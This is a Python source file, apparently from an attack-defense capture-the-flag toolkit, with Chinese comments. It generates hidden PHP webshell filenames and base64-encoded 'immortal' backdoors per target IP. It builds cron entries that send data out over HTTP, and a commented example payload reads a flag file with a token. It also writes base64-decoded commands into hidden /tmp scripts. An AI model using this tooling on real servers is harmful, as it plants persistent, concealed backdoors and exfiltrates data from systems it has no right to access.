import hashlib
import base64
import config
import time
import random
def uploadPackage(tarFileName):
    return "unimplementException"

#后门基本配置
class BackdoorDescription:
    ___trojContent=''
    def __init__(self,immortalTrojFilename,subTrojFileName,trojKey,immortalTrojContent):
        self.immortalTrojFilename=immortalTrojFilename
        self.subTrojFilename=subTrojFileName
        self.trojKey=trojKey
        self.trojContent=immortalTrojContent
    @property
    def subTrojectParam(self):
        return self.trojKey[:5]
    @property
    def trojContent(self):
        return self.__trojContent
    @trojContent.setter
    def trojContent(self,v):
        tmpTrojBase64Code=base64.b64encode(v.encode("utf-8")).decode("utf-8")
        self.__trojContent=config.uploader.format(tmpTrojBase64Code,self.immortalTrojFilename)
class BackdoorDescriptions:
    def __init__(self,ips,path,seed):
        self.childs=[]
        for index in range(len(ips)):
            #依据ip作为种子
            raw=f'sf{ips[index]}fs{seed}'
            
            #生成别名
            md5_1=hashlib.md5(raw.encode("utf-8")).hexdigest()
            md5_2=hashlib.md5(md5_1.encode("utf-8")).hexdigest()
            
            subTroj_key=md5_1
            immortalTroj_Name=md5_1[:24]
            subTroj_Name=md5_2[:-5]
            immortalTroj_Name=f'{path}.--{immortalTroj_Name}.php'
            subTroj_Name=f'{path}.--{subTroj_Name}.php'
            
            #生成内容
            subTrojContent=config.backdoor_tpl.format(subTroj_key[:5],md5_2)
            subTrojContent_b64=base64.b64encode(subTrojContent.encode('utf-8')).decode('utf-8')
            immortalTroj_Content=config.immortalTroj_tpl.format(subTrojContent_b64,subTroj_Name)

            self.childs.append(BackdoorDescription(immortalTroj_Name,subTroj_Name,subTroj_key,immortalTroj_Content))
    def __getitem__(self,index):
        return self.childs[index]
    def __setitem__(self, index, value):
        self.childs[index]=value
    def __delitem__(self,index):
        del self.childs[index]

def buildCrontab(interval,url,payload,httpType=0):
    #payload='flag="$(cat /home/web/flag/flag)"&token={token}'
    model=config.httpSendModel[httpType].format(url,payload)
    raw= f"{interval} * * * * {model}"
    return raw
def buildCmd(rawCmd):
    raw =base64.b64encode(f'{rawCmd}\n'.encode('utf-8')).decode('utf-8')
    md5Str=hashlib.md5(f"{str(time.time())}{raw}".encode("utf-8")).hexdigest()
    return f'/bin/echo \'{raw}\' | /usr/bin/base64 -d | /bin/cat  > /tmp/.--{md5Str}.sh',md5Str

#使用备份的镜像重新部署服务器
class reDeployServer():
    pass